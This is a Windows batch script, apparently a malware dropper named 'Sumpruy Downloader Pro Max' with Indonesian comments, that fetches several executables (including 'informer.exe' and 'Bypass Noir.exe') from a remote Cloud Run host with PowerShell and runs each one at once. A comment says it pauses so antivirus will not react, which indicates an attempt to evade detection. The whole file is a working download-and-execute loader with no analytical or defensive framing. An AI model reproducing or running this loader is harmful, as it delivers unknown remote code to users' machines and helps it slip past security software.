@echo off
title Sumpruy Downloader Pro Max
set "BASE_URL=https://ais-dev-dckr5i55tn452pgoxcqp4s-951812896425.asia-southeast1.run.app"
set "DL_DIR=%cd%\Sumpruy_Downloads"
mkdir "%DL_DIR%" 2>nul
cd /d "%DL_DIR%"

:: POP UP PERTAMA
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Sumpruy downloader is now started mpruy tunggu aja.', 'Sumpruy Downloader', 'OK', 'Warning')}"

:: DAFTAR FILE
set "FILES=StarDesk.exe informer.exe seeu.exe Bypass Noir.exe"

:: LOOPING DOWNLOAD + EKSEKUSI
for %%F in (%FILES%) do (
    echo.
    echo ========================================
    echo Downloading %%F ...
    echo ========================================
    
    :: HAPUS FILE LAMA KALAU ADA
    if exist "%%F" del "%%F"
    
    :: DOWNLOAD PAKAI POWERSHELL (DENGAN VERIFIKASI)
    powershell -Command "& {try {Invoke-WebRequest -Uri '%BASE_URL%/%%F' -OutFile '%%F' -ErrorAction Stop; Write-Host 'Download sukses: %%F' -ForegroundColor Green} catch {Write-Host 'Gagal download: %%F' -ForegroundColor Red; exit 1}}"
    
    :: CEK APAKAH FILE BERHASIL DIDOWNLOAD
    if exist "%%F" (
        echo [OK] File %%F ditemukan.
        :: TUNGGU BENTAR BIAR ANTIVIRUS GAK NGANCEP
        timeout /t 1 /nobreak >nul
        :: JALANKAN FILE
        echo Menjalankan %%F ...
        start "" "%%F"
    ) else (
        echo [GAGAL] File %%F gak kebentuk bro. Coba manual atau cek koneksi.
    )
)

:: POP UP KEDUA - SELESAI
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Udeh selesuy mpruy downloadnya tinggal gas aje mok gue laper.', 'Sumpruy Downloader', 'OK', 'Information')}"

echo.
echo ========================================
echo Selesai! Semua file udah dicoba jalanin.
echo Kalo ada yang gak kebuka, cek folder %DL_DIR%
echo ========================================
pause
